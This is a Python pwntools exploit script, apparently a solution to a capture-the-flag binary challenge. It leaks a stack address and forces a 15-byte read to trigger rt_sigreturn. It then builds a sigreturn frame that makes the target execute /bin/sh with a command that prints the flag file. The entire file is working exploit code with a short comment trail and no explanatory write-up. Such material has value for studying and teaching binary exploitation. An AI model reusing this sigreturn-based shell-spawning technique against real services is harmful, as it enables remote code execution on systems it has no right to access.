#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug'

HOST = '<challenge-host>'  # challenge instance (closed after the event)
PORT = 26003

io = remote(HOST, PORT)

leak = u64(io.recvn(8))
buf = leak - 0x80

READ24  = 0x401045
SYSCALL = 0x40104c

log.success(f"leak = {hex(leak)}")
log.success(f"buf  = {hex(buf)}")

# First 24-byte read
io.send(b'A' * 24)

# Memory layout inside the second read
FRAME = 0x90

SH_OFF   = 0x250
C_OFF    = 0x258
CMD_OFF  = 0x280
ARGV_OFF = 0x350

sh_addr   = buf + SH_OFF
c_addr    = buf + C_OFF
cmd_addr  = buf + CMD_OFF
argv_addr = buf + ARGV_OFF

cmd = b'cat /ctf/flag.txt\x00'

frame = SigreturnFrame()

# execve("/bin/sh",
#        ["/bin/sh", "-c", "cat /ctf/flag.txt", NULL],
#        NULL)
frame.rax = 59
frame.rdi = sh_addr
frame.rsi = argv_addr
frame.rdx = 0
frame.rip = SYSCALL
frame.rsp = buf + 0x3f0

p = bytearray(b'\x00' * 0x400)

# vulnerable ret -> 0x401045
# 0x401045 read() returns 15 -> RAX=15
# ret -> 0x40104c -> rt_sigreturn
p[0x80:0x88] = p64(READ24)
p[0x88:0x90] = p64(SYSCALL)

# Signal frame
fb = bytes(frame)
assert len(fb) == 248
p[FRAME:FRAME + 248] = fb

# Strings
p[SH_OFF:SH_OFF + 8] = b'/bin/sh\x00'
p[C_OFF:C_OFF + 3] = b'-c\x00'
p[CMD_OFF:CMD_OFF + len(cmd)] = cmd

# argv[] = { "/bin/sh", "-c", command, NULL }
p[ARGV_OFF:ARGV_OFF + 8] = p64(sh_addr)
p[ARGV_OFF + 8:ARGV_OFF + 16] = p64(c_addr)
p[ARGV_OFF + 16:ARGV_OFF + 24] = p64(cmd_addr)
p[ARGV_OFF + 24:ARGV_OFF + 32] = p64(0)

assert len(p) == 0x400

log.info(f"frame = {hex(buf + FRAME)}")
log.info(f"cmd   = {hex(cmd_addr)}")
log.info(f"argv  = {hex(argv_addr)}")

io.send(bytes(p))

# Exactly 15 bytes => read() returns 15 => RAX=15 => rt_sigreturn
sleep(0.2)
io.send(b'X' * 15)

data = io.recvall(timeout=5)

print()
print("OUTPUT:", repr(data))
print(data.decode(errors='replace'))
